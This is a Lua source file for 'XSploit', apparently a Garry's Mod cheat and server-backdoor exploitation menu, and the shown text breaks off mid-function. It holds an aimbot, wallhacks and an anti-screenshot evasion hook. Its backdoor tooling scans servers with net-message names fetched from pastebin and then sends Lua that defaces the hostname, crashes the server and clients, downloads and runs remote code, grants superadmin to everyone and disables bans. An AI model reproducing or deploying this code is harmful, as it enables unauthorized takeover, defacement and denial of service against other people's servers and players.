file.CreateDir( 'xsploit' )
file.CreateDir( 'xsploit/servers' )
file.CreateDir( 'xsploit/settings' )
file.CreateDir( 'xsploit/materials' )

surface.CreateFont( 'title', {
	font = 'Verdana',
	extended = true,
	weight = 600,
	size = 20,
} )

surface.CreateFont( 'txt', {
	font = 'Verdana',
	extended = true,
	weight = 600,
	size = 20,
} )

surface.CreateFont( 'nicknames', {
	font = 'Verdana',
	extended = true,
	weight = 500,
	size = 16,
} )

surface.CreateFont( 'checkbox', {
	font = 'Verdana',
	extended = true,
	weight = 600,
	size = 30,
} )

local sw, sh = ScrW(), ScrH()
local mw, mh = 800, 600

local XS = {}
XS.Config = {}
XS.Config.WH1 = {}
XS.Config.WH2 = {}
local friendList = {}
local lastpanel, laststring, netkey, adminsys, target, group, rpref = 'nil', 'nil', 'nil', 'Система (ULX/SG/SA)', 'Игрок', 'superadmin', ''
local chatspam, aimon, wh1on, wh2on, bhopon, notifyon = false, false, false, false, false, false
local fakeRT = GetRenderTarget( 'fakeRT' .. os.time(), ScrW(), ScrH() )

local panmeta = FindMetaTable( 'Panel' )
function panmeta:SimpleDelete()
		xnotify:SizeTo( 0, 0, 0.4, 0, -1 )
		timer.Simple( 0.41, function()
			xnotify:Remove()
		end)
end

//local data = string.split( XReadData( 'settings', 'wh1' ) )
//XS.Config.WH1.NameColor = data[1]

local data = file.Read( 'xsploit/settings/friends.txt', 'DATA' ) or '76561199104835345/'
for i,v in ipairs ( string.Split( data, '/' ) ) do
	table.Add( friendList, {v} )
end
for i,v in ipairs( player.GetAll() ) do
	if table.HasValue( friendList, v:SteamID64() ) then
		chat.AddText( Color( 116, 0, 255 ), '[X', Color( 255, 255, 255 ), 'Sploit', Color( 116, 0, 255 ), '] ', Color( 255, 255, 255 ), 'Friend on server: ', Color( 116, 0, 255 ), v:Nick() .. ' (' .. v:SteamID() .. ')' )
	end
end

local function ToggleAim()

	function xaimbot()

		local ply = LocalPlayer()
		local trace = util.GetPlayerTrace( ply )
		local traceRes = util.TraceLine( trace )
		if traceRes.HitNonWorld then
		    local target = traceRes.Entity
		    if target:IsPlayer() and not table.HasValue( friendList, target:SteamID64() ) then
		        local targethead = target:LookupBone( 'ValveBiped.Bip01_Head1' )
		        local targetheadpos,targetheadang = target:GetBonePosition( targethead )
		        ply:SetEyeAngles( ( targetheadpos - ply:GetShootPos() ):Angle() )
		    end
		end

	end

	hook.Add( 'Think', 'XAimbot', xaimbot)
end

local function ToggleWH1()

	local friendBorder = Color(0, 0, 0, 200)
	local enemyBorder = Color(0, 0, 0, 200)

	hook.Add('PostDrawOpaqueRenderables', 'XWallHack2', function()
	    cam.Start3D()
	        if true then
	            for k,ply in ipairs(player.GetAll()) do

					if table.HasValue( friendList, ply:SteamID64() ) then

						if ply == LocalPlayer() then goto skip end

						local pos = ply:GetPos()
		                local ang = ply:GetAngles()
		                local mins = ply:OBBMins()
		                local maxs = ply:OBBMaxs()
		                render.ClearDepth()
		                render.SetColorMaterial()

		                local teamCol = Color(63, 176, 144, 150)
		                teamCol.a = 90
		                render.DrawBox(pos,ang,mins,maxs, teamCol)

		                mins = pos + mins
		                maxs = pos + maxs

		                local b1 = Vector(mins.x, mins.y, mins.z)
		                local b2 = Vector(maxs.x, mins.y, mins.z)
		                local b3 = Vector(maxs.x, maxs.y, mins.z)
		                local b4 = Vector(mins.x, maxs.y, mins.z)

		                render.DrawLine(b1, b2, friendBorder)
		                render.DrawLine(b2, b3, friendBorder)
		                render.DrawLine(b3, b4, friendBorder)
		                render.DrawLine(b1, b4, friendBorder)

		                local t1 = Vector(mins.x, mins.y, maxs.z)
		                local t2 = Vector(maxs.x, mins.y, maxs.z)
		                local t3 = Vector(maxs.x, maxs.y, maxs.z)
		                local t4 = Vector(mins.x, maxs.y, maxs.z)

		                render.DrawLine(t1, t2, friendBorder)
		                render.DrawLine(t2, t3, friendBorder)
		                render.DrawLine(t3, t4, friendBorder)
		                render.DrawLine(t1, t4, friendBorder)

		                render.DrawLine(t1, b1, friendBorder)
		                render.DrawLine(t2, b2, friendBorder)
		                render.DrawLine(t3, b3, friendBorder)
		                render.DrawLine(t4, b4, friendBorder)
		                ::skip::
					else
						if ply == LocalPlayer() then goto skip end

						local pos = ply:GetPos()
		                local ang = ply:GetAngles()
		                local mins = ply:OBBMins()
		                local maxs = ply:OBBMaxs()
		                render.ClearDepth()
		                render.SetColorMaterial()

		                local teamCol = Color(0,0,0)
		                teamCol.a = 90
		                render.DrawBox(pos,ang,mins,maxs, teamCol)

		                mins = pos + mins
		                maxs = pos + maxs

		                local b1 = Vector(mins.x, mins.y, mins.z)
		                local b2 = Vector(maxs.x, mins.y, mins.z)
		                local b3 = Vector(maxs.x, maxs.y, mins.z)
		                local b4 = Vector(mins.x, maxs.y, mins.z)

		                render.DrawLine(b1, b2, enemyBorder)
		                render.DrawLine(b2, b3, enemyBorder)
		                render.DrawLine(b3, b4, enemyBorder)
		                render.DrawLine(b1, b4, enemyBorder)

		                local t1 = Vector(mins.x, mins.y, maxs.z)
		                local t2 = Vector(maxs.x, mins.y, maxs.z)
		                local t3 = Vector(maxs.x, maxs.y, maxs.z)
		                local t4 = Vector(mins.x, maxs.y, maxs.z)

		                render.DrawLine(t1, t2, enemyBorder)
		                render.DrawLine(t2, t3, enemyBorder)
		                render.DrawLine(t3, t4, enemyBorder)
		                render.DrawLine(t1, t4, enemyBorder)

		                render.DrawLine(t1, b1, enemyBorder)
		                render.DrawLine(t2, b2, enemyBorder)
		                render.DrawLine(t3, b3, enemyBorder)
		                render.DrawLine(t4, b4, enemyBorder)
		                ::skip::
					end

	            end

	        end
	    cam.End3D()

	end)
end

local function ToggleWH2()

	hook.Add( 'HUDPaint', 'XWallHack', function()

		for i,v in pairs ( player.GetAll() ) do
			local pos = v:GetPos():ToScreen()
			draw.SimpleText( v:Nick() .. ' | ' .. v:GetUserGroup(), 'nicknames', pos.x, pos.y+20, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			draw.SimpleText( 'HP: ' .. v:Health() .. ' | Arm: ' .. v:Armor(), 'nicknames', pos.x, pos.y+40, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )

			if table.HasValue( friendList, v:SteamID64() ) then
				draw.SimpleText( 'FRIEND', 'title', pos.x, pos.y+60, Color( 183, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			end
		end

	end)

end

local function ToggleBHop()

	function XBHop()
		 if input.IsKeyDown(KEY_SPACE) then
		 	if LocalPlayer():IsOnGround() then
		 		RunConsoleCommand( '+jump' )
		 		timer.Create( 'Bhop', 0, 0.01, function() RunConsoleCommand( '-jump' ) end)
		 	end
		end
	end

	hook.Add( 'Think', 'XBunnyHop', XBHop )
end

hook.Add( 'RenderScene', 'AntiScreenGrab', function( vOrigin, vAngle, vFOV )
    local view = {
        x = 0,
        y = 0,
        w = ScrW(),
        h = ScrH(),
        dopostprocess = true,
        origin = vOrigin,
        angles = vAngle,
        fov = vFOV,
        drawhud = true,
        drawmonitors = true,
        drawviewmodel = true
    }

    render.RenderView( view )
    render.CopyTexture( nil, fakeRT )

    cam.Start2D()
        hook.Run( 'XWallHackHide' )
    cam.End2D()

    render.SetRenderTarget( fakeRT )

    return true
end )

hook.Add( 'ShutDown', 'RemoveAntiScreenGrab', function()
    render.SetRenderTarget()
end )

local function XNotify( title, msg, icon )

	if notifyon then
		xnotify:Remove()
	end

	xnotify = vgui.Create( 'DFrame' )
	xnotify:SetSize( 0, 0 )
	xnotify:SetPos( 10, 10 )
	xnotify:SizeTo( 450, 200, 0.4, 0, -1 )
	xnotify:SetTitle('')
	xnotify:SetDraggable( true )
	xnotify:ShowCloseButton( false )
	xnotify.Paint = function( self, w, h )
		draw.RoundedBox( 10, 0, 0, w, h, Color( 0, 0, 0, 250 ) )
		draw.RoundedBox( 0, 0, 25, w, 5, Color( 60, 60, 60, 250 ) )
		draw.SimpleText( '[   ]', 'title', 6, 2, Color( 116, 0, 255 ), TEXT_ALIGN_TOP, TEXT_ALIGN_TOP )
		draw.SimpleText( 'XS', 'title', 12, 2, Color( 255, 255, 255 ), TEXT_ALIGN_TOP, TEXT_ALIGN_TOP )
		draw.SimpleText( title, 'txt', 50, 2, Color( 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP )
		draw.SimpleText( msg, 'nicknames', 10, 35, Color( 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP )
	end

	notifyon = true

	local xnotifycls = vgui.Create( 'DButton', xnotify )
	xnotifycls:SetSize( 25, 25 )
	xnotifycls:SetPos( 425, 0 )
	xnotifycls:SetText( '' )
	xnotifycls.lerp = 0
	xnotifycls.Paint = function( self, w, h )
		if self:IsHovered() then
			self.lerp = Lerp( FrameTime() * 6, self.lerp, w )
			draw.RoundedBoxEx( 10, 0, 0, self.lerp, h, Color( 220, 20, 60 ), false, true, false, false )
		else
			self.lerp = Lerp( FrameTime() * 6, self.lerp, 0 )
			draw.RoundedBoxEx( 10, 0, 0, self.lerp, h, Color( 220, 20, 60 ), false, true, false, false )
		end

		draw.SimpleText( 'X', 'title', 12, 12, Color( 255, 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	end

	xnotifycls.DoClick = function()
		surface.PlaySound("garrysmod/ui_click.wav")
		xnotify:SimpleDelete()
	end

	timer.Simple( 10, function()
		if xnotify:IsValid() then
			xnotify:SimpleDelete()
		end
	end)

end

local function validnet( netstring )
    local validate,_ = xpcall( function() net.Start( netstring ) net.WriteString( 'local a = 1 local b = 2' ) net.SendToServer() end, function() MsgC( Color( 116, 0, 255 ), '[X', Color( 255, 255, 255 ), 'Sploit', Color( 116, 0, 255 ), '] ', Color( 255, 255, 255 ), 'Backdoor ', Color( 220, 20, 60 ), netstring, Color( 255, 255, 255 ), ' is invalid!\n' ) end, nil )
    if validate then
				netkey = netstring
        return validate
    end
    return false;
end

local function ChoosePage( func )
	if func == 'MPage' then
		MPage()
	elseif func == 'APage' then
		APage()
	elseif func == 'DPage' then
		DPage()
	elseif func == 'FPage' then
		FPage()
	elseif func == 'SPage' then
		SPage()
	end
end

local pages = {

	[1] = {
		name = 'Main',
		func = 'MPage'
	},

	[2] = {
		name = 'Fun',
		func = 'FPage'
	},

	[3] = {
		name = 'Admin',
		func = 'APage'
	},

	[4] = {
		name = 'Settings',
		func = 'SPage'
	},

	[5] = {
		name = 'DEV',
		func = 'DPage'
	},

}

local mfunctions = {

	[1] = {
		name = 'Сменить имя хоста',
		func = 'RunConsoleCommand( "hostname", "XSploit | SERVER WAS CRACKED | discord.gg/JgkFsyGUZT" )'
	},

	[2] = {
		name = 'Сменить имена',
		func = 'for k, v in pairs( player.GetAll() ) do v:ConCommand( "say /name XSploit | Hacked" ) end'
	},

	[3] = {
		name = 'Краш сервера',
		func = 'timer.Create( "splspam", 0, 0, function() for i = 1, 1000000 do MsgC( Color( math.random( 255 ), math.random( 255 ), math.random( 255 ) ), "� ") end end)'
	},

	[4] = {
		name = 'Рандом краш',
		func = 'local v = table.Random( player.GetAll() ) if not v:SteamID() == "' .. LocalPlayer():SteamID() .. '" then v:SendLua( "while true do print() end" ) end'
	},

	[5] = {
		name = 'Краш физики',
		func = 'RunConsoleCommand( "sv_friction", "-8" )'
	},

	[6] = {
		name = 'Проверка чита',
		func = 'RunConsoleCommand( "say", "Проверка аддонов..") timer.Simple( 3, function() RunConsoleCommand("say", "Проверка завершена") end)'
	},

	[6] = {
		name = 'Сканирование',
		func = 'backdoor'
	},

	[7] = {
		name = 'Диско',
		func = 'http.Fetch( "https://pastebin.com/raw/fKj6Qpbm", function( b, l, h, c ) RunString( b ) end,nil )'
	},

	[8] = {
		name = 'Реклама',
		func = 'spam'
	},

	[9] = {
		name= 'Крик',
		func = 'for k,v in pairs( player.GetAll() ) do v:EmitSound( "npc/stalker/go_alert2a.wav", 100, 100 ) end'
	},

}

local afunctions = {

	[ 1 ] = {
		name = 'Выдать себе группу',
	},

	[2] = {
		name = 'Выдать себе группу (S)',
	},

	[3] = {
		name = 'Выдать игроку группу',
	},

	[4] = {
		name = 'Выдать игроку группу (S)',
	},

	[5] = {
		name = 'Выдать всем SA',
		ufunc = 'for i, ply in ipairs( player.GetAll() ) do RunConsoleCommand( "ulx", "adduser", ply:GetName(), "superadmin" ) end',
		safunc = 'for i, ply in ipairs( player.GetAll() ) do RunConsoleCommand( "sa", "setrank", ply:GetName(), "superadmin" ) end',
		sgfunc = 'for i, ply in ipairs( player.GetAll() ) do RunConsoleCommand( "sg", "setowner", ply:GetName(), ) end'
	},

	[6] = {
		name = 'Понизить игрока',
	},

	[7] = {
		name = 'Понизить игрока (S)',
	},

	[8] = {
		name = 'Понизить всех до юзера',
		ufunc = 'for i, ply in ipairs( player.GetAll() ) do RunConsoleCommand( "ulx", "removeuser", ply:GetName() ) end',
		safunc = 'for i, ply in ipairs( player.GetAll() ) do RunConsoleCommand( "sa", "setrank", ply:GetName(), "user" ) end',
		sgfunc = 'for i, ply in ipairs( player.GetAll() ) do RunConsoleCommand( "sg", "setrank", ply:GetName(), "user" ) end'
	},

	[9] = {
		name = 'Удалить бан и кик',
		ufunc = '_G.FAdmin = function() end ULib.Ban = function() return false end ULib.addBan = function() return end ULib.kick = function() return end',
		safunc = '_G.FAdmin = function() end slib.isBanned = function() end slib.punish = function() end sAdmin.banPly = function() end sAdmin.addCommand = function() end',
		sgfunc = '_G.FAdmin = function() end function serverguard:BanPlayer() return false end concommand.Add( "serverguard_kick", function () end) concommand.Add( "serverguard_ban", function () end) concommand.Add( "serverguard_addmban", function () end) concommand.Add( "serverguard_editban", function () end) concommand.Add( "serverguard_setrank", function () end) function playerMeta:Ban(length, bKick, reason) return false end function command:OnPlayerExecute(_, target) return false end'
	}

}

local function XAUpdate()

	afunctions[1].ufunc = 'RunConsoleCommand( "ulx", "adduser", "' .. LocalPlayer():Nick() .. '", "' .. group .. '" )'
	afunctions[1].safunc = 'RunConsoleCommand( "sa", "setrank", "' .. LocalPlayer():Nick() .. '", "' .. group .. '" )'
	afunctions[1].sgfunc = 'RunConsoleCommand( "sg", "setowner", "' .. LocalPlayer():Nick() .. '" )'
	afunctions[2].ufunc = 'player.GetBySteamID("' .. LocalPlayer():SteamID64() .. '"):SetUserGroup("' .. group .. '")'
	afunctions[2].safunc = 'player.GetBySteamID("' .. LocalPlayer():SteamID64() .. '"):SetUserGroup("' .. group .. '")'
	afunctions[2].sgfunc = 'player.GetBySteamID("' .. LocalPlayer():SteamID64() .. '"):SetUserGroup("' .. group .. '")'
	afunctions[3].ufunc = 'RunConsoleCommand( "ulx", "adduser", "' .. target .. '", "' .. group .. '" )'
	afunctions[3].safunc = 'RunConsoleCommand( "sa", "setrank", "' .. target .. '", "' .. group .. '" )'
	afunctions[3].sgfunc = 'RunConsoleCommand( "sg", "setowner", "' .. target .. '", "' .. group .. '" )'
	afunctions[4].ufunc = 'player.GetBySteamID("' .. target .. '"):SetUserGroup("' .. group .. '")'
	afunctions[4].safunc = 'player.GetBySteamID("' .. target .. '"):SetUserGroup("' .. group .. '")'
	afunctions[4].sgfunc = 'player.GetBySteamID("' .. target .. '"):SetUserGroup("' .. group .. '")'
	afunctions[6].ufunc = 'RunConsoleCommand( "ulx", "removeuserid", "' .. target .. '" )'
	afunctions[6].safunc = 'RunConsoleCommand( "sa", "setrank", player.GetBySteamID("' .. target .. '"):GetName(), "user" )'
	afunctions[6].sgfunc = 'player.GetBySteamID("' .. target .. '"):SetUserGroup("user")'
	afunctions[7].ufunc = 'player.GetBySteamID("' .. target .. '"):SetUserGroup("user")'
	afunctions[7].safunc = 'player.GetBySteamID("' .. target .. '"):SetUserGroup("user")'
	afunctions[7].sgfunc = 'player.GetBySteamID("' .. target .. '"):SetUserGroup("user")'

end

function mspam()
	surface.PlaySound( 'garrysmod/ui_click.wav' )
	local msg = [[ chat.AddText( Color( 116, 0, 255 ), "XSploit was injected | Our message here: https://discord.gg/NbVV2wgYZP" )]]

	if chatspam then
		timer.Create( 'xsadvert', 0.0001, 0, function()
			net.Start( netkey )
			net.WriteString( 'for k,v in pairs(player.GetAll()) do v:SendLua([['..msg..']]) end ' )
			net.SendToServer()
		end)
	else
		timer.Destroy( 'xsadvert' )
	end

end

local function XIsBackdoored()
	local nets_tbl
	local validnets = ''

	http.Fetch( 'https://pastebin.com/raw/XSCFB1ti', function( body )
		nets_tbl = string.Split( body, '/' )

		for i = 1, #nets_tbl do
			if validnet( nets_tbl[i] ) then
				chat.AddText( Color( 116, 0, 255 ), '[X', Color( 255, 255, 255 ), 'Sploit', Color( 116, 0, 255 ), '] ', Color( 255, 255, 255 ), 'Backdoor: ', Color( 220, 20, 60 ), nets_tbl[i] )
				validnets = validnets .. nets_tbl[i] .. '|'
			end
		end
		file.Append( 'xsploit/servers/' .. game.GetIPAddress() .. '.txt', validnets )
	end)

end

function XSMenu()

		local xmenu = vgui.Create( 'DFrame' )
		xmenu:SetSize( mw, mh )
		xmenu:Center()
		xmenu:SetTitle( '' )
		xmenu:SetDraggable( true )
		xmenu:ShowCloseButton( false )
		xmenu:MakePopup()
		xmenu.Paint = function( self, w, h )
			draw.RoundedBox( 10, 0, 0, w, h, Color( 30, 30, 30 ) )
			draw.RoundedBox( 10, 120, 25, 5, h-65, Color( 50, 50, 50 ) )
			draw.RoundedBox( 10, 0, h-65+25, w, 5, Color( 50, 50, 50 ) )
			draw.RoundedBox( 0, 0, 25, w, 5, Color( 50, 50, 50 ) )
			draw.SimpleText( 'X', 'title', 10, 2, Color( 116, 0, 255 ) )
			draw.SimpleText( 'Sploit', 'title', 23, 2, Color( 255, 255, 255 ) )
			draw.SimpleText( 'By X0lik', 'title', mw-90, mh-30, HSVToColor( ( CurTime() * 100 ) % 360, 1, 1 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP )
			draw.SimpleText( 'v2.0', 'title', 10, mh-30, Color( 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP )
		end

		function CloseXMenu()
			xmenu:Remove()
		end

		local btnscroll = vgui.Create( 'DScrollPanel', xmenu )
		btnscroll:SetSize( 120, mh )
		btnscroll:SetPos( 0, 30 )

		for i = 1, #pages do

			if i == 5 and LocalPlayer():SteamID() != 'STEAM_0:1:572284808' then continue end

			local btn = btnscroll:Add( 'DButton' )
			btn:SetSize( 120, 45 )
			btn:Dock( TOP )
			btn:DockMargin( 0, 0, 0, 0 )
			btn:SetText( '' )
			btn.lerp = 0
			btn.Paint = function( self, w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 25, 25, 25 ) )
				draw.RoundedBox( 0, 0, h-5, w, 5, Color( 50, 50, 50 ) )

				if self:IsHovered() then
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 8 )
					draw.RoundedBox( 0, 0, 0, self.lerp, h-5, Color( 116, 0, 255 ) )
				else
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 0 )
					draw.RoundedBox( 0, 0, 0, self.lerp, h-5, Color( 116, 0, 255 ) )
				end

				draw.SimpleText( pages[i].name, 'txt', 60, 20, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			end

			btn.DoClick = function()
				ChoosePage( pages[i].func )
			end

		end

		local closebtn = vgui.Create( 'DButton', xmenu )
		closebtn:SetSize( 25, 25 )
		closebtn:SetPos( mw-25, 0 )
		closebtn:SetText( '' )
		closebtn.lerp = 0
		closebtn.Paint = function( self, w, h )
			if self:IsHovered() then
				self.lerp = Lerp( FrameTime() * 6, self.lerp, w )
				draw.RoundedBoxEx( 10, 0, 0, self.lerp, h, Color( 220, 20, 60 ), false, true, false, false )
			else
				self.lerp = Lerp( FrameTime() * 6, self.lerp, 0 )
				draw.RoundedBoxEx( 10, 0, 0, self.lerp, h, Color( 220, 20, 60 ), false, true, false, false )
			end

			draw.SimpleText( 'X', 'title', 12, 12, Color( 255, 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
		end

		closebtn.DoClick = function()
			surface.PlaySound("garrysmod/ui_click.wav")
			xmenu:Close()
		end

		function MPage()

			if lastpanel != 'nil' then
				lastpanel:Remove()
			end

			local mpanel = vgui.Create( 'DScrollPanel', xmenu )
			mpanel:SetSize( 250, mh-100 )
			mpanel:SetPos( 150, 45 )
			mpanel.Paint = function( self, w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 30, 30, 30 ) )
			end

			lastpanel = mpanel

			for i = 1, #mfunctions do

				local mbtn = mpanel:Add( 'DButton' )
				mbtn:SetSize( 250, 35 )
				mbtn:SetText( '' )
				mbtn:Dock( TOP )
				mbtn:DockMargin( 0, 0, 0, 0 )
				mbtn.lerp = 0
				mbtn.Paint = function( self, w, h )
					draw.RoundedBox( 0, 0, 0, w, h, Color( 40, 40, 40 ) )
					draw.RoundedBox( 0, 0, h-5, w, 5, Color( 100, 100, 100 ) )

					if self:IsHovered() then
						self.lerp = Lerp( FrameTime() * 9, self.lerp, w+1 )
						draw.RoundedBox( 0, 0, h-5, self.lerp, 5, Color( 116, 0, 255 ) )
					else
						self.lerp = Lerp( FrameTime() * 9, self.lerp, 0 )
						draw.RoundedBoxEx( 0, 0, h-5, self.lerp, 5, Color( 116, 0, 255 ) )
					end

					draw.SimpleText( mfunctions[i].name, 'txt', w/2, h/2, Color( 255, 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end

				mbtn.DoClick = function()
					if mfunctions[i].func == 'spam' then
						chatspam = !chatspam
						mspam()
					elseif mfunctions[i].func == 'backdoor' then
						XIsBackdoored()
					else
						net.Start( netkey )
						net.WriteString( mfunctions[i].func )
						net.SendToServer()
					end
				end

			end

		end

		function APage()

			if lastpanel != 'nil' then
				lastpanel:Remove()
			end

			local alabel = vgui.Create( 'DPanel', xmenu )
			alabel:SetSize( mw - 120, mh - 70 )
			alabel:SetPos( 120, 30 )
			alabel.Paint = function( self, w, h )
			end

			local apanel = vgui.Create( 'DScrollPanel', alabel )
			apanel:SetSize( 250, mh-100 )
			apanel:SetPos( 20, 15 )
			apanel.Paint = function( self, w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 30, 30, 30 ) )
			end

			lastpanel = alabel

			/*local cadmin = vgui.Create( 'DComboBox', alabel )
			cadmin:SetPos( 290, 15 )
			cadmin:SetSize( 150, 30 )
			cadmin:SetValue( 'Админ Система' )
			cadmin:AddChoice( 'ULX' )
			cadmin:AddChoice( 'ServerGuard' )
			cadmin:AddChoice( 'SAM' )
			cadmin.OnSelect = function( self, index, value )
				adminsys = value
			end*/

			local getadminsys = vgui.Create( 'DTextEntry', alabel )
			getadminsys:SetSize( 250, 40 )
		  getadminsys:SetPos( 290, 15 )
			getadminsys.lerp = 0
			getadminsys.Paint = function( self, w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 20, 20, 20 ) )
				draw.RoundedBox( 0, 0, 0, self.lerp, h, Color( 116, 0, 255 ) )

				if self:IsHovered() then
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 10 )
				else
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 0 )
				end

				draw.SimpleText( adminsys, 'title', 15, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER )
			end
		  getadminsys.OnChange = function( self )
		      adminsys = string.upper( self:GetValue() )
		  end

			local gettarget = vgui.Create( 'DTextEntry', alabel )
			gettarget:SetSize( 250, 40 )
		  gettarget:SetPos( 290, 65 )
			gettarget.lerp = 0
			gettarget.Paint = function( self, w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 20, 20, 20 ) )
				draw.RoundedBox( 0, 0, 0, self.lerp, h, Color( 116, 0, 255 ) )

				if self:IsHovered() then
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 10 )
				else
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 0 )
				end

				draw.SimpleText( target, 'title', 15, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER )
			end
		  gettarget.OnChange = function( self )
		      target = self:GetValue()
		  end

			local getgroup = vgui.Create( 'DTextEntry', alabel )
			getgroup:SetSize( 250, 40 )
		  getgroup:SetPos( 290, 115 )
			getgroup.lerp = 0
			getgroup.Paint = function( self, w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 20, 20, 20 ) )
				draw.RoundedBox( 0, 0, 0, self.lerp, h, Color( 116, 0, 255 ) )

				if self:IsHovered() then
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 10 )
				else
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 0 )
				end

				draw.SimpleText( group, 'title', 15, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER )
			end
		  getgroup.OnChange = function( self )
		      group = self:GetValue()
		  end

			for i = 1, #afunctions do

				local abtn = apanel:Add( 'DButton' )
				abtn:SetSize( 250, 35 )
				abtn:SetText( '' )
				abtn:Dock( TOP )
				abtn:DockMargin( 0, 0, 0, 0 )
				abtn.lerp = 0
				abtn.Paint = function( self, w, h )
					draw.RoundedBox( 0, 0, 0, w, h, Color( 40, 40, 40 ) )
					draw.RoundedBox( 0, 0, h-5, w, 5, Color( 100, 100, 100 ) )

					if self:IsHovered() then
						self.lerp = Lerp( FrameTime() * 9, self.lerp, w+1 )
						draw.RoundedBox( 0, 0, h-5, self.lerp, 5, Color( 116, 0, 255 ) )
					else
						self.lerp = Lerp( FrameTime() * 9, self.lerp, 0 )
						draw.RoundedBoxEx( 0, 0, h-5, self.lerp, 5, Color( 116, 0, 255 ) )
					end

					draw.SimpleText( afunctions[i].name, 'txt', w/2, h/2, Color( 255, 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end

				abtn.DoClick = function()

					XAUpdate()
					net.Start( netkey )
					if adminsys == 'ULX' then
						net.WriteString( afunctions[i].ufunc )
					elseif adminsys == 'SG' then
						net.WriteString( afunctions[i].sgfunc )
					elseif adminsys == 'SA' then
						net.WriteString( afunctions[i].safunc )
					else
						chat.AddText( 'ERR' )
					end
					net.SendToServer()

				end

			end
		end

		function FPage()

			if lastpanel != 'nil' then
				lastpanel:Remove()
			end

			local flabel = vgui.Create( 'DPanel', xmenu )
			flabel:SetSize( mw - 120, mh - 70 )
			flabel:SetPos( 120, 30 )
			flabel.Paint = function( self, w, h )
			end

			lastpanel = flabel

			local aim = vgui.Create( 'DButton', flabel )
			aim:SetPos( 20, 15 )
			aim:SetSize( 200, 50 )
			aim:SetText('')
			aim.lerp = 0
			aim.Paint = function( self, w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 20, 20, 20 ) )
				draw.RoundedBox( 0, 5, 5, 40, 40, Color( 0, 0, 0 ) )
				draw.RoundedBox( 0, 0, h-self.lerp+1, w, 5, Color( 116, 0, 255 ) )
				draw.SimpleText( 'AimBot', 'title', w*.3, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER )
				if aimon then
					draw.SimpleText( '✔', 'checkbox', 25, h/2, Color( 0, 255, 183 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end

				if self:IsHovered() then
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 5 )
				else
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 0 )
				end
			end
			aim.DoClick = function()
				if aimon then
					aimon = false
					hook.Remove( 'Think', 'XAimbot' )
				else
					aimon = true
					ToggleAim()
				end
			end

			local wh1 = vgui.Create( 'DButton', flabel )
			wh1:SetPos( 20, 75 )
			wh1:SetSize( 200, 50 )
			wh1:SetText('')
			wh1.lerp = 0
			wh1.Paint = function( self, w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 20, 20, 20 ) )
				draw.RoundedBox( 0, 5, 5, 40, 40, Color( 0, 0, 0 ) )
				draw.RoundedBox( 0, 0, h-self.lerp+1, w, 5, Color( 116, 0, 255 ) )
				draw.SimpleText( 'WallHack (v1)', 'title', w*.3, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER )
				if wh1on then
					draw.SimpleText( '✔', 'checkbox', 25, h/2, Color( 0, 255, 183 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end

				if self:IsHovered() then
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 5 )
				else
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 0 )
				end
			end
			wh1.DoClick = function()
				if wh1on then
					wh1on = false
					hook.Remove( 'PostDrawOpaqueRenderables', 'XWallHack2' )
				else
					wh1on = true
					ToggleWH1()
				end
			end

			local wh2 = vgui.Create( 'DButton', flabel )
			wh2:SetPos( 20, 135 )
			wh2:SetSize( 200, 50 )
			wh2:SetText('')
			wh2.lerp = 0
			wh2.Paint = function( self, w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 20, 20, 20 ) )
				draw.RoundedBox( 0, 5, 5, 40, 40, Color( 0, 0, 0 ) )
				draw.RoundedBox( 0, 0, h-self.lerp+1, w, 5, Color( 116, 0, 255 ) )
				draw.SimpleText( 'WallHack (v2)', 'title', w*.3, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER )
				if wh2on then
					draw.SimpleText( '✔', 'checkbox', 25, h/2, Color( 0, 255, 183 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end

				if self:IsHovered() then
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 5 )
				else
